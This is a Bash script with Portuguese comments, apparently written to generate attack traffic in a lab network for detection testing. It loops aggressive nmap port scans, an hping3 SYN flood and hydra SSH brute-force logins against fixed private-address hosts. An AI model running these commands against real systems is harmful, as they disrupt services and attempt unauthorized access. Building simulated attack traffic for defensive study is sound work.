#!/bin/bash
# Script para gerar tráfego malicioso no cliente atacante
# Simula: port scan, SYN flood, brute force SSH

# NÃO use 'set -e': queremos continuar mesmo se um comando falhar

TARGET_SERVER="192.168.57.20"
TARGET_CLIENT2="192.168.57.12"
DURATION=${1:-3600}  # padrão: 1 hora (3600 segundos)

echo "Iniciando geração de tráfego malicioso por ${DURATION} segundos..."
echo "Alvo: servidor em ${TARGET_SERVER} e cliente em ${TARGET_CLIENT2}"
echo "Log: /tmp/traffic_malicioso_$(date +%s).log"
LOG_FILE="/tmp/traffic_malicioso_$(date +%s).log"

END_TIME=$(($(date +%s) + DURATION))

# Função para parar ao pressionar Ctrl+C
trap "echo 'Tráfego malicioso interrompido'; exit 0" SIGINT SIGTERM

while [ $(date +%s) -lt $END_TIME ]; do
    # Port scan com nmap (mais agressivo com -T4)
    echo "[$(date '+%H:%M:%S')] Executando port scan..." | tee -a "$LOG_FILE"
    sudo nmap -T4 -sS -p 1-1000 ${TARGET_SERVER} > /dev/null 2>&1 &
    sudo nmap -T4 -sS -p 1-1000 ${TARGET_CLIENT2} > /dev/null 2>&1 &

    # SYN flood simulado com hping3
    echo "[$(date '+%H:%M:%S')] Gerando SYN flood..." | tee -a "$LOG_FILE"
    sudo timeout 5 hping3 -S -p 80 --flood ${TARGET_SERVER} > /dev/null 2>&1 &

    # Brute force SSH (tentativas de login)
    echo "[$(date '+%H:%M:%S')] Tentando brute force SSH..." | tee -a "$LOG_FILE"
    for user in admin root test vagrant ubuntu; do
        timeout 5 hydra -l ${user} -p password ssh://${TARGET_SERVER} > /dev/null 2>&1 &
    done

    # Varredura de UDP
    echo "[$(date '+%H:%M:%S')] Varredura UDP..." | tee -a "$LOG_FILE"
    sudo nmap -T4 -sU -p 53,123,161 ${TARGET_SERVER} > /dev/null 2>&1 &

    # Aguarda apenas 2 segundos antes da próxima iteração
    sleep 2

done

echo "Geração de tráfego malicioso concluída."
